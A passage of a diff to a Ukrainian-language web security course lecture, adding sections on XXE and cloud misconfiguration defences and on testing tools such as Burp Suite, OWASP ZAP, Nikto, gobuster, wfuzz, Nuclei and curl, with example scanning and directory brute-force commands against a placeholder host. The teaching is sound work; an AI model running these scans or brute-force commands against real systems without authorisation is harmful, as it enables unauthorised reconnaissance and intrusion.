+          <li>Використовувати JSON замість XML де можливо</li>
+          <li>Оновлювати XML-бібліотеки</li>
+        </ul>
+        <pre><code># Python — безпечний XML parsing
+import defusedxml.ElementTree as ET
+tree = ET.parse('data.xml')
+
+# Java — вимкнення DTD
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+# PHP — вимкнення зовнішніх сутностей
+libxml_disable_entity_loader(true);</code></pre>
+
+        <h3>Cloud Misconfiguration</h3>
+        <ul>
+          <li><strong>AWS S3:</strong> публічні бакети з чутливими даними. Інструменти: <code>aws s3 ls s3://bucket --no-sign-request</code>, S3Scanner</li>
+          <li><strong>Azure Blob Storage:</strong> публічні контейнери. MicroBurst для enumeration</li>
+          <li><strong>GCP:</strong> публічні Cloud Storage бакети, відкриті Firebase бази</li>
+          <li><strong>Shodan / Censys:</strong> пошукові рушії для misconfigured серверів та IoT-пристроїв</li>
+        </ul>
+
+        <h3>Запобігання: Security Misconfiguration</h3>
+        <ul>
+          <li>Hardened baseline: CIS Benchmarks для кожної платформи</li>
+          <li>Мінімальна платформа: видалити непотрібні компоненти та документацію</li>
+          <li>Регулярний аудит конфігурацій та оновлень</li>
+          <li>Сегментована архітектура: ізоляція компонентів</li>
+          <li>Автоматичне сканування: ScoutSuite (cloud), Prowler (AWS), Checkov (IaC)</li>
+          <li>Infrastructure as Code: Terraform, Ansible — відтворювані конфігурації</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.8 Інструменти тестування веб-безпеки                       -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.8 Інструменти тестування веб-безпеки</h2>
+
+        <p>Тестування безпеки веб-додатків потребує спеціалізованих інструментів для перехоплення, аналізу та модифікації HTTP-трафіку, автоматичного сканування вразливостей та ручного тестування.</p>
+
+        <h3>Burp Suite (PortSwigger)</h3>
+        <p><strong>Burp Suite</strong> — провідна платформа для тестування безпеки веб-додатків, розроблена <strong>PortSwigger</strong> (засновник: Dafydd Stuttard, автор "The Web Application Hacker's Handbook").</p>
+        <table>
+          <tr>
+            <th>Редакція</th>
+            <th>Ціна</th>
+            <th>Ключові можливості</th>
+          </tr>
+          <tr>
+            <td><strong>Community</strong></td>
+            <td>Безкоштовно</td>
+            <td>Proxy, Repeater, Decoder, Comparer, Sequencer (без Scanner)</td>
+          </tr>
+          <tr>
+            <td><strong>Professional</strong></td>
+            <td>$449/рік</td>
+            <td>Повний Scanner, необмежений Intruder, BApp Store, Collaborator</td>
+          </tr>
+          <tr>
+            <td><strong>Enterprise</strong></td>
+            <td>Від $8,395/рік</td>
+            <td>CI/CD інтеграція, scheduled scans, multi-user, RBAC</td>
+          </tr>
+        </table>
+
+        <h3>Модулі Burp Suite</h3>
+        <ul>
+          <li><strong>Proxy:</strong> перехоплення та модифікація HTTP/HTTPS у реальному часі. Для HTTPS встановити CA-сертифікат Burp (http://burp/cert). WebSocket підтримується</li>
+          <li><strong>Scanner (Pro):</strong> автоматичне виявлення SQLi, XSS, XXE, SSRF тощо. Passive + Active scan</li>
+          <li><strong>Intruder:</strong> автоматизовані атаки. Типи:
+            <ul>
+              <li><strong>Sniper:</strong> один payload set, кожна позиція окремо</li>
+              <li><strong>Battering Ram:</strong> один payload, всі позиції одночасно</li>
+              <li><strong>Pitchfork:</strong> паралельні payload sets (1:1)</li>
+              <li><strong>Cluster Bomb:</strong> всі комбінації (декартовий добуток)</li>
+            </ul>
+          </li>
+          <li><strong>Repeater:</strong> ручна відправка та модифікація HTTP-запитів, основний інструмент для PoC</li>
+          <li><strong>Decoder:</strong> Base64, URL, HTML entities, Hex, Gzip, ASCII Hex</li>
+          <li><strong>Comparer:</strong> diff двох відповідей — корисно для blind vulnerabilities</li>
+          <li><strong>Sequencer:</strong> статистичний аналіз випадковості токенів та session ID</li>
+        </ul>
+
+        <h3>Розширення Burp Suite (BApp Store)</h3>
+        <table>
+          <tr>
+            <th>Розширення</th>
+            <th>Призначення</th>
+          </tr>
+          <tr>
+            <td><strong>Autorize</strong></td>
+            <td>Автоматичне тестування контролю доступу — повторює запити з іншим токеном</td>
+          </tr>
+          <tr>
+            <td><strong>Logger++</strong></td>
+            <td>Розширене логування з фільтрацією та пошуком</td>
+          </tr>
+          <tr>
+            <td><strong>JWT Editor</strong></td>
+            <td>Перегляд, редагування та атаки на JWT-токени</td>
+          </tr>
+          <tr>
+            <td><strong>Active Scan++</strong></td>
+            <td>Додаткові перевірки: host header injection, cache poisoning</td>
+          </tr>
+          <tr>
+            <td><strong>Param Miner</strong></td>
+            <td>Виявлення прихованих параметрів та заголовків</td>
+          </tr>
+          <tr>
+            <td><strong>Turbo Intruder</strong></td>
+            <td>Високошвидкісний Intruder, Python-скрипти, race conditions</td>
+          </tr>
+          <tr>
+            <td><strong>Hackvertor</strong></td>
+            <td>Розширене кодування/декодування з тегами</td>
+          </tr>
+        </table>
+
+        <h3>OWASP ZAP (Zed Attack Proxy)</h3>
+        <p><strong>OWASP ZAP</strong> — безкоштовний open-source проксі. Кросплатформний (Java). Ідеальний для початківців та CI/CD.</p>
+        <ul>
+          <li><strong>Spider:</strong> автоматичне обходження сайту. Traditional Spider + AJAX Spider (для SPA)</li>
+          <li><strong>Passive Scan:</strong> аналіз трафіку без модифікації — missing headers, info disclosure</li>
+          <li><strong>Active Scan:</strong> активне тестування параметрів (SQLi, XSS, path traversal)</li>
+          <li><strong>Fuzzer:</strong> параметрний фазинг з вбудованими wordlists</li>
+          <li><strong>HUD:</strong> Heads Up Display — overlay у браузері для інтерактивного тестування</li>
+          <li><strong>REST API:</strong> повне керування через API для автоматизації</li>
+          <li><strong>Docker:</strong> офіційний образ для CI/CD інтеграції</li>
+        </ul>
+        <pre><code># ZAP у CI/CD (Docker)
+# Baseline scan (passive only, швидкий)
+docker run -t zaproxy/zap-stable zap-baseline.py -t https://target.com
+
+# Full scan (passive + active)
+docker run -t zaproxy/zap-stable zap-full-scan.py -t https://target.com
+
+# API scan (OpenAPI/Swagger)
+docker run -t zaproxy/zap-stable zap-api-scan.py \
+  -t https://target.com/api/v1/openapi.json -f openapi</code></pre>
+
+        <h3>Nikto</h3>
+        <p><strong>Nikto</strong> — open-source сканер веб-серверів. 6,700+ перевірок: застарілі версії, небезпечні файли, default credentials, misconfigurations.</p>
+        <pre><code># Базове сканування
+nikto -h https://target.com
+
+# Конкретний порт, збереження результатів
+nikto -h target.com -p 8443 -o report.html -Format htm
+
+# Через proxy (Burp)
+nikto -h target.com -useproxy http://127.0.0.1:8080</code></pre>
+
+        <h3>Directory Brute-Forcing</h3>
+        <p>Пошук прихованих директорій, файлів та endpoint'ів:</p>
+        <pre><code># gobuster — швидкий Go-based інструмент
+gobuster dir -u https://target.com \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,html,txt -t 50
+
+# gobuster modes: dir, dns, vhost, fuzz
+
+# feroxbuster — рекурсивний content discovery (Rust)
+feroxbuster -u https://target.com -w wordlist.txt --depth 3 --threads 50
+
+# wfuzz — гнучкий fuzzer
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt \
+  --hc 404 https://target.com/FUZZ
+
+# dirb — класичний інструмент
+dirb https://target.com /usr/share/dirb/wordlists/common.txt</code></pre>
+
+        <h3>Technology Detection</h3>
+        <pre><code># whatweb — CLI fingerprinting
+whatweb https://target.com
+# Apache[2.4.41], PHP[7.4.3], WordPress[5.8], jQuery[3.6.0]
+
+# Wappalyzer — розширення браузера (Chrome/Firefox)
+# BuiltWith — онлайн-сервіс (builtwith.com)</code></pre>
+
+        <h3>Nuclei (ProjectDiscovery)</h3>
+        <p><strong>Nuclei</strong> — швидкий template-based сканер. 8,000+ YAML-шаблонів. Активна спільнота.</p>
+        <pre><code># Сканування з усіма шаблонами
+nuclei -u https://target.com
+
+# За тегами або серйозністю
+nuclei -u https://target.com -tags cve,sqli,xss
+nuclei -u https://target.com -severity critical,high
+
+# Список URL з файлу
+nuclei -l urls.txt -tags owasp
+
+# Оновлення шаблонів
+nuclei -update-templates</code></pre>
+
+        <h3>Browser DevTools</h3>
+        <p>Вбудовані інструменти розробника (F12) — незамінні для тестування:</p>
+        <ul>
+          <li><strong>Network:</strong> HTTP-запити/відповіді, headers, timing. Фільтрація за типом (XHR, JS)</li>
+          <li><strong>Console:</strong> виконання JavaScript, перегляд помилок, тестування XSS</li>
+          <li><strong>Application:</strong> cookies, localStorage, sessionStorage. Перегляд і модифікація</li>
+          <li><strong>Sources:</strong> вихідний код JavaScript, breakpoints, debugging</li>
+          <li><strong>Elements:</strong> DOM-дерево, inline editing, пошук прихованих полів форм</li>
+        </ul>
+
+        <h3>curl для HTTP-тестування</h3>
+        <pre><code># GET з verbose output
+curl -v https://target.com/api/users
+
+# POST з даними
+curl -X POST https://target.com/login \
+  -d "username=admin&amp;password=test" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+
+# JSON API
+curl -X POST https://target.com/api/auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"test"}'
+
+# З cookie
+curl -b "session=abc123" https://target.com/dashboard
+
+# Тільки headers відповіді
+curl -I https://target.com
+
+# Follow redirects + ігнорувати SSL
+curl -L -k https://target.com</code></pre>
+
+        <h3>Порівняльна таблиця інструментів</h3>
+        <table>
+          <tr>
+            <th>Критерій</th>
+            <th>Burp Suite Pro</th>
+            <th>Burp Community</th>
+            <th>OWASP ZAP</th>
+            <th>Nikto</th>
+            <th>Nuclei</th>
+          </tr>
+          <tr>
+            <td><strong>Ціна</strong></td>
+            <td>$449/рік</td>
+            <td>Безкоштовно</td>
+            <td>Безкоштовно</td>
+            <td>Безкоштовно</td>
+            <td>Безкоштовно</td>
+          </tr>
+          <tr>
+            <td><strong>Proxy</strong></td>
+            <td>Так</td>
+            <td>Так</td>
+            <td>Так</td>
+            <td>Ні</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>Scanner</strong></td>
+            <td>Потужний</td>
+            <td>Ні</td>
+            <td>Добрий</td>
+            <td>Базовий</td>
+            <td>Template-based</td>
+          </tr>
+          <tr>
+            <td><strong>Intruder/Fuzzer</strong></td>
+            <td>Потужний</td>
+            <td>Обмежений</td>
+            <td>Добрий</td>
+            <td>Ні</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>CI/CD</strong></td>
+            <td>Enterprise</td>
+            <td>Ні</td>
+            <td>Так (Docker)</td>
+            <td>Обмежено</td>
+            <td>Так</td>
+          </tr>
+          <tr>
+            <td><strong>Розширення</strong></td>
+            <td>BApp Store</td>
+            <td>BApp Store</td>
+            <td>Marketplace</td>
+            <td>Plugins</td>
+            <td>Templates (YAML)</td>
+          </tr>
+          <tr>
+            <td><strong>Найкраще для</strong></td>
+            <td>Ручний пентест</td>
+            <td>Навчання</td>
+            <td>DevSecOps</td>
+            <td>Швидка перевірка</td>
+            <td>CVE / mass scan</td>
+          </tr>
+        </table>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/6.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/8.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="6.html" class="nav-btn">&larr; Попередня</a>
+      <a href="8.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
